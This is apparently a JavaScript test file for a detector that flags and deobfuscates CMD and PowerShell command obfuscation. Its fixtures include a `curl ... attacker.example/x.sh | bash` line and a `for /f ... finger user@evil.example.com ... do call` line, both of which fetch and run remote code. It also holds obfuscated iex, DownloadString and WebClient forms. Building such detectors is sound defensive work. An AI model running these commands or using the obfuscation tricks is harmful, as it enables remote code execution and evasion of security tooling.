'use strict';
// cmd-obfuscation.test.js — CMD + PowerShell command-obfuscation
// detection / deobfuscation.
//
// `_findCommandObfuscationCandidates(text, context)` scans for a
// catalogue of known obfuscation techniques (caret insertion, set-var
// concatenation, env-var substring abuse, PowerShell concat / replace
// / format / backtick escape) and emits a candidate per match with
// the deobfuscated text on `candidate.deobfuscated`.
//
// The technique catalogue is huge — this file covers two canonical,
// load-bearing techniques (caret insertion + env-var substring) plus
// the empty-input contract.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

// cmd-obfuscation.js attaches onto EncodedContentDetector.prototype.
// It calls `throwIfAborted()` from constants.js inside its inner
// loops as part of the watchdog plumbing.
//
// `entropy.js`, `safelinks.js`, and `ioc-extract.js` are loaded so the
// post-processor regression test below can drive
// `_processCommandObfuscation()` end-to-end.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/cmd-obfuscation.js',
]);
const { EncodedContentDetector, IOC } = ctx;
const d = new EncodedContentDetector();

/** Helper: collect every candidate matching `pred` and project across realms. */
function pick(candidates, pred) {
  return host(candidates.filter(pred));
}

test('cmd-obfuscation: caret insertion deobfuscates p^o^w^e^r^s^h^e^l^l', () => {
  // The classic CMD caret-insertion: cmd.exe treats `^` as the line-
  // continuation / generic escape character, so `p^o^w^e^r^s^h^e^l^l`
  // is semantically equivalent to `powershell`. Sensitivity gate
  // requires the cleaned word to match SENSITIVE_CMD_KEYWORDS — which
  // includes `powershell`.
  const text = 'p^o^w^e^r^s^h^e^l^l -Command "Get-Process"';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const carets = pick(candidates, c => /Caret Insertion/.test(c.technique));
  assert.ok(carets.length >= 1, `expected caret candidate; got: ${JSON.stringify(host(candidates))}`);
  assert.equal(carets[0].deobfuscated, 'powershell');
});

test('cmd-obfuscation: caret insertion ignores benign words', () => {
  // The sensitivity gate prevents `h^e^l^l^o` from emitting — only
  // SENSITIVE_CMD_KEYWORDS hits (or ≥3 double-pair runs) survive.
  const text = 'h^e^l^l^o w^o^r^l^d goodbye';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const carets = pick(candidates, c => /Caret Insertion/.test(c.technique));
  assert.equal(carets.length, 0, 'benign words must not emit caret-insertion candidates');
});

test('cmd-obfuscation: env-var substring resolves %COMSPEC:~N,M%', () => {
  // The signature CMD obfuscation: index into well-known env vars to
  // build a command character-by-character. KNOWN_ENV_VARS
  // (`COMSPEC = "C:\\Windows\\System32\\cmd.exe"`) is what the resolver
  // consults. We need ≥3 substring tokens on a single line for the
  // line-finder to fire.
  // Indices into "C:\\Windows\\System32\\cmd.exe":
  //   chars: C=0 :=1 \=2 W=3 i=4 n=5 d=6 o=7 w=8 s=9 \=10 S=11 y=12 s=13 ...
  // Build a 3-token line by snapshotting individual chars.
  const text = 'echo %COMSPEC:~3,1%%COMSPEC:~4,1%%COMSPEC:~5,1%';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const env = pick(candidates, c => /Env Var Substring/.test(c.technique));
  assert.ok(env.length >= 1, `expected env-var-substring candidate; got: ${JSON.stringify(host(candidates))}`);
  // After resolution, the three tokens (W, i, n) should appear in the
  // deobfuscated output.
  assert.match(env[0].deobfuscated, /Win/);
});

test('cmd-obfuscation: returns empty for short / non-CMD text', () => {
  // The function bails early when the text is < 10 chars, and the
  // various branch regexes naturally return zero matches on plain
  // English. No exceptions, no candidates.
  const out1 = d._findCommandObfuscationCandidates('short', {});
  assert.deepEqual(host(out1), []);
  const out2 = d._findCommandObfuscationCandidates(
    'A perfectly ordinary paragraph of plain English with no obfuscation or commands.',
    {}
  );
  // We tolerate zero candidates here — the regex set should not match
  // any of the obfuscation patterns. Spot-check by category.
  const carets = host(out2.filter(c => /Caret/.test(c.technique)));
  const envs   = host(out2.filter(c => /Env Var/.test(c.technique)));
  assert.equal(carets.length, 0);
  assert.equal(envs.length, 0);
});

test('cmd-obfuscation: PowerShell string concatenation joins quoted parts', () => {
  // PowerShell's `('Down' + 'load' + 'String')` shape is a classic
  // string-concat obfuscation. The candidate's `deobfuscated` must
  // be the joined token. The plausibility gate insists on a
  // SENSITIVE_CMD_KEYWORDS match, which `DownloadString` hits.
  const text = `$x = ('Down' + 'load' + 'String')`;
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const concats = pick(candidates, c => /String Concatenation/.test(c.technique));
  assert.ok(concats.length >= 1);
  assert.equal(concats[0].deobfuscated, 'DownloadString');
});

test('cmd-obfuscation: PowerShell backtick escape recovers `pow`er`shell`', () => {
  // PowerShell `` ` `` is the line-continuation / escape character; the
  // backtick regex now requires ≥1 internal backtick (relaxed from ≥2
  // — the real gate is the suspiciousKeywords whitelist) AND the
  // cleaned form must hit that whitelist.
  // `pow`er`shell` cleans to "powershell" which is in the list.
  const text = '$x = pow`er`shell -Command $payload';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(candidates, c => /Backtick/.test(c.technique));
  assert.ok(ticks.length >= 1, `expected backtick candidate; got: ${JSON.stringify(host(candidates))}`);
  assert.equal(ticks[0].deobfuscated.toLowerCase(), 'powershell');
});

test('cmd-obfuscation: single-backtick LOLBin — `pow`ershell` recovers "powershell"', () => {
  // Single-tick obfuscation of a whitelisted LOLBin. Pre-fix the ≥2
  // gate rejected this; post-fix the suspiciousKeywords whitelist is
  // the only real gate.
  const text = '$x = pow`ershell -Command $payload';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(candidates, c => /Backtick/.test(c.technique));
  assert.ok(ticks.length >= 1, `expected single-tick backtick candidate; got: ${JSON.stringify(host(candidates))}`);
  assert.equal(ticks[0].deobfuscated.toLowerCase(), 'powershell');
});

test('cmd-obfuscation: single-backtick in hyphenated name — `Invoke`-Expression`', () => {
  // One tick, positioned adjacent to the hyphen. The backtick regex
  // allows `` ` `` on either side of the hyphen via `` `?-`? ``.
  const text = '& Invoke`-Expression $cmd';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(candidates, c => /Backtick/.test(c.technique));
  assert.ok(ticks.length >= 1, `expected single-tick backtick candidate; got: ${JSON.stringify(host(candidates))}`);
  assert.equal(ticks[0].deobfuscated.toLowerCase(), 'invoke-expression');
});

test('cmd-obfuscation: single-backtick alias `i`ex` recovers "iex"', () => {
  // `iex` is the canonical PS alias for Invoke-Expression. With the
  // whitelist now containing `iex`, a single-tick `i`ex` form is
  // recovered. Raw length 4 chars (≥ regex 3-char minimum).
  const text = '$payload | i`ex';
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(candidates, c => /Backtick/.test(c.technique));
  assert.ok(ticks.length >= 1, `expected i\`ex candidate; got: ${JSON.stringify(host(candidates))}`);
  assert.equal(ticks[0].deobfuscated.toLowerCase(), 'iex');
});

test('cmd-obfuscation: non-LOLBin single-backtick token is NOT emitted', () => {
  // English-contraction-rendered-with-backtick (`won`t`, `don`t`,
  // `c`est`) must be dropped by the suspiciousKeywords whitelist —
  // this is the FP-defence proof for relaxing the count floor.
  const text = `I won\`t run this and c\`est la vie`;
  const candidates = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(candidates, c => /Backtick/.test(c.technique));
  assert.equal(ticks.length, 0, `non-LOLBin cleaned form must be filtered by whitelist; got: ${JSON.stringify(host(ticks))}`);
});

// ── Post-processor: `for /f … do call %X` mirror ────────────────────────────
//
// The CMD-specific behavioural tell — "captured command output is
// executed as a shell command" — must be attached as an IOC.PATTERN
// only when the candidate is a real CMD `for /f … do call %X` shape.
// Pre-fix, this pattern was emitted from the post-processor whenever
// `candidate._executeOutput` was set, so bash/python/php/js
// candidates that share the `_executeOutput` flag for severity
// purposes were mis-labelled with a CMD-only pattern. The fix moves
// the IOC.PATTERN attachment to the CMD candidate site as
// `_patternIocs`; the post-processor now only iterates that array.

test('cmd-obfuscation: `for /f … do call %A` candidate carries CMD-specific _patternIocs', () => {
  // Anchor the candidate-emission contract: the CMD `for /f` site
  // attaches the behavioural mirror; bash / python / php / js sites
  // do not.
  const text = `for /f "tokens=*" %A in ('finger user@evil.example.com') do call %A`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const cand = cands.find(c => /for \/f/i.test(c.technique));
  assert.ok(cand, `expected for /f candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(cand._executeOutput, true, 'expected _executeOutput marker');
  assert.ok(Array.isArray(cand._patternIocs) && cand._patternIocs.length === 1,
    `expected CMD candidate to carry _patternIocs; got ${JSON.stringify(host(cand._patternIocs))}`);
  assert.match(cand._patternIocs[0].url, /for\s*\/f.*call %X/i);
  assert.equal(cand._patternIocs[0].severity, 'high');
});

test('cmd-obfuscation: post-processor mirrors `for /f` pattern into IOC.PATTERN row', async () => {
  const text = `for /f "tokens=*" %A in ('finger user@evil.example.com') do call %A`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const cand = cands.find(c => /for \/f/i.test(c.technique));
  assert.ok(cand, 'expected for /f candidate');

  const finding = await d._processCommandObfuscation(cand);
  assert.ok(finding, 'expected post-processor to produce a finding');

  const patternIocs = (finding.iocs || []).filter(i => i.type === IOC.PATTERN);
  const forFHit = patternIocs.find(i => /for\s*\/f.*call %X/i.test(i.url || ''));
  assert.ok(forFHit, `expected CMD \`for /f\` IOC.PATTERN row; got: ${JSON.stringify(host(patternIocs))}`);
  assert.equal(forFHit.severity, 'high');

  // Severity is at least 'high' (the `_executeOutput` + `_patternIocs`
  // bumps both target the same tier; a critical from dangerousPatterns
  // would also satisfy this).
  assert.ok(finding.severity === 'high' || finding.severity === 'critical',
    `expected severity ≥ high; got ${finding.severity}`);
});

// ── .NET weaponisation-namespace chain recognition ─────────────────────────
//
// The backtick decoder's token regex used to be [a-zA-Z0-9`], which
// could not span dotted identifiers like `Sy`st`em.Ne`t.We`b`Cl`ie`nt`.
// Result: the script `$x = "Ne`w`-O`b`je`ct Sy`st`em.Ne`t.We`b`Cl`ie`nt"`
// produced ONE finding (New-Object) and the namespace chain stayed
// obfuscated in every view, including "Load for analysis" and the
// stitched reassembled script.
//
// The fix: widen the char class to include `.` so dotted tokens match
// as a single candidate, AND extend the shared whitelist
// `_PS_SUSPICIOUS_KEYWORDS_RE` with the curated .NET weaponisation-
// namespace set (System.Net.WebClient / WebRequest / Sockets.TcpClient;
// System.IO.Compression.{Deflate,Gzip}Stream; System.Reflection.Assembly
// / AssemblyBuilder; System.Diagnostics.Process / ProcessStartInfo;
// System.Management.Automation.ScriptBlock; System.Convert;
// System.Text.Encoding; System.Runtime.InteropServices.Marshal;
// System.Net.Http.HttpClient). Each entry is a documented download-
// cradle / process-spawn / AMSI-bypass / code-load primitive.

test('cmd-obfuscation: PS backtick recognises .NET namespace chain — `System.Net.WebClient`', () => {
  const text = '$x = "Sy`st`em.Ne`t.We`b`Cl`ie`nt"';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(cands, c => /Backtick/.test(c.technique));
  assert.ok(ticks.length >= 1, `expected backtick candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(ticks[0].deobfuscated.toLowerCase(), 'system.net.webclient');
});

test('cmd-obfuscation: PS backtick adjacent cmdlet + namespace produce two independent candidates', () => {
  // The user-reported bug fixture: one line with two backticked tokens
  // separated by whitespace. Before the fix, only the first token
  // (New-Object) emitted a candidate — the dotted namespace chain
  // was unreachable to the regex. After the fix, both emit as
  // independent, non-overlapping candidates.
  const text = '$x = "Ne`w`-O`b`je`ct Sy`st`em.Ne`t.We`b`Cl`ie`nt"';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(cands, c => /Backtick/.test(c.technique));
  assert.equal(ticks.length, 2, `expected two candidates; got ${ticks.length}: ${JSON.stringify(host(ticks))}`);
  const cleaned = ticks.map(t => t.deobfuscated.toLowerCase()).sort();
  assert.deepEqual(cleaned, ['new-object', 'system.net.webclient']);
  // Non-overlapping offsets — critical for the reassembler's splice
  // to honestly replace each span without leaving raw-token tails.
  ticks.sort((a, b) => a.offset - b.offset);
  assert.ok(ticks[0].offset + ticks[0].length <= ticks[1].offset,
    `expected non-overlapping spans; got ${JSON.stringify(host(ticks))}`);
});

test('cmd-obfuscation: PS backtick unlisted namespace is filtered by whitelist', () => {
  // `System.Generic.List` is a legitimate .NET type but not a
  // weaponisation primitive. The widened regex will now match the
  // dotted token, but the whitelist must drop it to avoid drowning
  // benign scripts in findings.
  const text = '$x = "Sy`st`em.Gene`ric.Li`st"';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const ticks = pick(cands, c => /Backtick/.test(c.technique));
  assert.equal(ticks.length, 0,
    `unlisted namespace must be filtered; got: ${JSON.stringify(host(ticks))}`);
});

test('cmd-obfuscation: PS backtick namespace candidate has consistent offset/length/bytes/text', async () => {
  // Structural invariant: the "Load for analysis" button reads
  // `finding.decodedBytes`, the sidebar preview reads
  // `_deobfuscatedText`, and the reassembler splices into
  // `[offset, offset+length)`. All four must agree — if they don't,
  // clicking "Load for analysis" yields a different payload than
  // the card preview promises (the user-reported Bug 1), and the
  // stitched script ends up with leftover obfuscated text (Bug 2).
  const text = '$x = "Sy`st`em.Ne`t.We`b`Cl`ie`nt"';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const btk = cands.find(c => /Backtick/.test(c.technique));
  assert.ok(btk, 'expected backtick candidate');
  const finding = await d._processCommandObfuscation(btk);
  // decodedBytes must round-trip to the same text the preview shows.
  const decoded = new TextDecoder('utf-8').decode(finding.decodedBytes);
  assert.equal(decoded, finding._deobfuscatedText,
    'decodedBytes must decode to the same string _deobfuscatedText reports');
  assert.match(decoded, /System\.Net\.WebClient/);
  // Source length is the raw backticked span; the reassembler uses
  // this to advance past the span in the splice loop. Asserting
  // bounded positivity here catches the "length=0 but text non-empty"
  // degenerate case that would cause an infinite splice loop.
  assert.ok(finding.length > 0);
  assert.ok(finding.offset >= 0);
});

test('cmd-obfuscation: PS backtick namespace candidate emits no spurious domain / URL IOC', async () => {
  // `System.Net.WebClient` must NOT be mistaken for a hostname by
  // tldts / the IOC-extract sweep. An accidental IOC.DOMAIN here
  // would pollute pivotable indicators with a type name that has
  // no DNS / WHOIS reality.
  const text = '$x = "Sy`st`em.Ne`t.We`b`Cl`ie`nt"';
  const cands = d._findCommandObfuscationCandidates(text, {});
  const btk = cands.find(c => /Backtick/.test(c.technique));
  assert.ok(btk, 'expected backtick candidate');
  const finding = await d._processCommandObfuscation(btk);
  const iocs = finding.iocs || [];
  const bogus = iocs.filter(i => i.type === IOC.DOMAIN || i.type === IOC.URL);
  assert.equal(bogus.length, 0,
    `expected no domain/URL IOCs from namespace token; got: ${JSON.stringify(host(bogus))}`);
});

test('cmd-obfuscation: shared whitelist constant covers both -replace and backtick branches', () => {
  // Structural pin: both branches must reference the same constant
  // so future additions don't drift between them (the original cause
  // of the namespace-chain blindspot was the two branches carrying
  // hand-maintained copies of the LOLBin subset).
  const fs = require('node:fs');
  const path = require('node:path');
  const src = fs.readFileSync(
    path.resolve(__dirname, '..', '..', 'src/decoders/cmd-obfuscation.js'),
    'utf8',
  );
  // Single declaration of the constant.
  const decl = src.match(/const\s+_PS_SUSPICIOUS_KEYWORDS_RE\s*=/g) || [];
  assert.equal(decl.length, 1, 'exactly one declaration of _PS_SUSPICIOUS_KEYWORDS_RE');
  // At least two references — the two branches that used to inline
  // their own copy of the whitelist.
  const refs = src.match(/_PS_SUSPICIOUS_KEYWORDS_RE\.test/g) || [];
  assert.ok(refs.length >= 2,
    `expected ≥2 .test() references to the shared constant; got ${refs.length}`);
});

// ── Detection-only sentinel (deobfuscated === raw) ──────────────────────────
//
// A candidate whose `deobfuscated` is byte-identical to its `raw` has
// no peel to present — the pattern IS the payload (bash live-fetch
// curl|sh, eval $(curl …), source <(wget …), etc.). Wrapping it in an
// `encoded-content` finding produces a tautological "Deobfuscation"
// card whose preview mirrors the input and whose "Load for analysis"
// button replaces the input with an identical copy. The post-processor
// short-circuits these into a `{ _detectionOnly: true, iocs, severity }`
// sentinel; the host (`app-load.js`) routes the IOCs to
// `findings.externalRefs` and drops the sentinel from
// `findings.encodedContent`.

test('cmd-obfuscation: _processCommandObfuscation returns _detectionOnly sentinel when deobfuscated === raw', async () => {
  const candidate = {
    type: 'cmd-obfuscation',
    technique: 'Synthetic Detection-Only',
    raw: 'curl -s http://attacker.example/x.sh | bash',
    offset: 0,
    length: 45,
    deobfuscated: 'curl -s http://attacker.example/x.sh | bash',
    _executeOutput: true,
    _patternIocs: [{ url: 'synthetic T1105 mirror', severity: 'critical' }],
  };
  const result = await d._processCommandObfuscation(candidate);
  assert.ok(result, 'expected sentinel result');
  assert.equal(result._detectionOnly, true,
    'expected _detectionOnly sentinel when deobfuscated === raw');
  // No encoded-content fields leak through.
  assert.equal(result.type, undefined,
    'sentinel must NOT carry `type: encoded-content`');
  assert.equal(result._deobfuscatedText, undefined,
    'sentinel must NOT carry _deobfuscatedText (no tautological card)');
  assert.equal(result.decodedBytes, undefined,
    'sentinel must NOT carry decodedBytes');
  assert.equal(result.canLoad, undefined,
    'sentinel must NOT advertise canLoad (no drill-down)');
  // Severity and IOCs survive onto the sentinel so the host can
  // escalate risk via externalRefs.
  assert.ok(Array.isArray(result.iocs) && result.iocs.length >= 1,
    'sentinel must carry `iocs` for host-side externalRefs merge');
  const mirror = result.iocs.find(i => i.type === IOC.PATTERN && /synthetic T1105/.test(i.url || ''));
  assert.ok(mirror,
    `expected _patternIocs mirror to flow through; got: ${JSON.stringify(host(result.iocs))}`);
  assert.ok(result.severity === 'high' || result.severity === 'critical',
    `expected severity ≥ high on _executeOutput + critical _patternIocs; got ${result.severity}`);
});

test('cmd-obfuscation: _processCommandObfuscation returns a normal encoded-content finding when deobfuscated differs from raw', async () => {
  // Control for the above: a real peel (raw carets → cleaned
  // powershell command) must still produce the `encoded-content`
  // finding with `_deobfuscatedText` populated and `canLoad: true`.
  const candidate = {
    type: 'cmd-obfuscation',
    technique: 'Synthetic Peel',
    raw: 'p^o^w^e^r^s^h^e^l^l -Command "Get-Process"',
    offset: 0,
    length: 42,
    deobfuscated: 'powershell -Command "Get-Process"',
  };
  const result = await d._processCommandObfuscation(candidate);
  assert.ok(result, 'expected finding');
  assert.equal(result._detectionOnly, undefined,
    'normal candidate must NOT produce a _detectionOnly sentinel');
  assert.equal(result.type, 'encoded-content',
    'normal candidate must produce an encoded-content finding');
  assert.equal(result._deobfuscatedText, candidate.deobfuscated,
    '_deobfuscatedText must carry the actual peel');
  assert.equal(result.canLoad, true,
    'normal encoded-content findings advertise canLoad');
  // Schema discriminator: cmd-obfuscation findings must stamp
  // `findingKind: 'technique'` so the sidebar suppresses the
  // `<encoding>-encoded content` title template (which reads as
  // nonsense for behavioural-detection techniques). Consumed by
  // `src/app/app-sidebar.js`.
  assert.equal(result.findingKind, 'technique',
    "_processCommandObfuscation must stamp findingKind: 'technique'");
  // Tautological `hint: candidate.technique` has been removed — it
  // duplicated the title. `hint` is now reserved for genuinely
  // descriptive extra context (e.g. base64-hex.js uses it for
  // "PE executable header (4D5A)").
  assert.equal(result.hint, undefined,
    'tautological hint === encoding must not be set');
});

// ── Unresolved-sentinel rejection ──────────────────────────────────────────
//
// CMD / batch reassembly uses `⟨VAR:~start,length⟩` and `⟨!cleaned!⟩`
// structural placeholders for unresolved substring operations; bash
// uses `⟨…⟩` for elided fragments; AppleScript uses
// `⟨unresolved:NAME⟩`. All three sentinel families share U+27E8 /
// U+27E9 delimiters. These must never reach IOC buckets — see
// `src/constants.js::hasUnresolvedSentinel` for the canonical gate.
// This test covers two gates in the cmd-obfuscation pipeline:
//   1. `_extractIOCsFromDecoded` rejects sentinel-bearing URLs.
//   2. `_processCommandObfuscation`'s `_patternIocs` mirror loop
//      skips labels that leaked a sentinel via string interpolation.

test('cmd-obfuscation: _extractIOCsFromDecoded rejects URLs carrying ⟨VAR:~start,len⟩ sentinels', () => {
  // Bytes that simulate a partially-resolved CMD reassembly output —
  // the host portion is a substring-op placeholder the resolver
  // couldn't fill. The URL regex would match the whole string (the
  // default excludes exclude ASCII `<>()` but not U+27E8/9); the
  // belt-and-braces `add()` gate and the hardened regex character
  // class both drop the value before it lands in `iocs`.
  const payload = 'start http://\u27E8VAR:~0,3\u27E9.example/stage2 && '
                + 'start http://real.example/\u27E8VAR:~5,10\u27E9/path';
  const bytes = new TextEncoder().encode(payload);
  const iocs = d._extractIOCsFromDecoded(bytes);
  for (const i of iocs) {
    assert.ok(!/\u27E8|\u27E9/.test(i.url || ''),
      `no sentinel may reach IOC buckets; leaked: ${JSON.stringify(i)}`);
  }
});

test('cmd-obfuscation: _processCommandObfuscation drops _patternIocs labels containing sentinels', async () => {
  // Synthetic candidate whose `_patternIocs` label interpolated a
  // resolved value that still carries a sentinel (e.g.
  // `Get-Command wildcard — "<glob>" resolves to ⟨VAR:~0,5⟩`). The
  // post-processor's mirror loop must reject this row rather than
  // surface a non-pivotable string in the sidebar.
  const candidate = {
    type: 'cmd-obfuscation',
    technique: 'Synthetic Sentinel Leak',
    raw: 'echo hi',
    offset: 0,
    length: 7,
    // Peel differs from raw so we take the normal `encoded-content`
    // branch (not the `_detectionOnly` sentinel branch). The peel
    // itself stays clean so the canonical URL extractor doesn't
    // contribute any sentinel-bearing IOC of its own.
    deobfuscated: 'echo clean',
    _patternIocs: [
      { url: 'Clean pattern label \u2014 keep', severity: 'medium' },
      { url: 'Get-Command wildcard \u2014 resolves to \u27E8VAR:~0,5\u27E9 (T1027)', severity: 'high' },
      { url: 'AppleScript partial \u2014 https://\u27E8unresolved:_X\u27E9/', severity: 'high' },
    ],
  };
  const result = await d._processCommandObfuscation(candidate);
  assert.ok(result, 'expected finding from normal peel branch');
  const patternRows = (result.iocs || []).filter(i => i.type === IOC.PATTERN);
  // Clean label survived.
  assert.ok(patternRows.some(r => /Clean pattern label/.test(r.url || '')),
    `clean label must pass the gate; got: ${JSON.stringify(host(patternRows))}`);
  // No sentinel-bearing label leaked.
  const leaky = patternRows.filter(r => /\u27E8|\u27E9/.test(r.url || ''));
  assert.equal(leaky.length, 0,
    `no _patternIocs row may carry a sentinel; leaked: ${JSON.stringify(host(leaky))}`);
});
